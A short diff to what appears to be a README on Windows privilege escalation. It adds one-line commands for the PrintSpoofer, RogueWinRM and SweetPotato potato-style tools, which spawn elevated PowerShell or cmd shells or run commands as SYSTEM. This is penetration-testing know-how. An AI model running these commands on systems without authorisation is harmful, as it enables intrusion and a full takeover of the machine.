@@ -5,10 +5,11 @@ Exploit it with [juicy-potatato](https://github.com/ohpe/juicy-potato) or [Rougu
 
 Some commands for these tools:
 
-1. PrintSpoofer (My favorite): ```PrintSpoofer.exe -i -c powershell```
+1. PrintSpoofer (My favorite) : ```PrintSpoofer.exe -i -c powershell```
 
 <p align="center">
   <img src="demo.gif">
 </p>
 
-2. RogueWinRM : 
+2. RogueWinRM : ```RogueWinRM.exe -p C:\windows\system32\cmd.exe``` or ```RogueWinRM.exe -p C:\windows\system32\cmd.exe -a "powershell"```
+3. SweetPotato : ```SweetPotato.exe -a whoami```
